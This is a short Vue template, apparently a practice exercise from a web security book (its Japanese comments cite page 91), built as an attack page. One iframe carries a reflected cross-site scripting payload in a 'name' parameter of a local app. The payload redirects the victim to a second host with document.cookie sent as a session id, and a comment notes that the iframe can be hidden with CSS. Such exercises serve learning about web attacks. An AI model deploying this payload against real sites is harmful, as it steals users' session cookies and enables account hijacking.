<template>
  <div>
    <div>
      本の91ページのやつ</br>
      以下のiframeはCSSで隠せる
    </div>
    <iframe width=320 height=100 src="http://localhost:3000/show?name=<script>window.location='http://localhost:3333/hoge?sid='%2Bdocument.cookie;</script>"></iframe>
    <iframe width=320 height=100 src="http://localhost:3000/show?name=watanata"></iframe>
  </div>

</template>

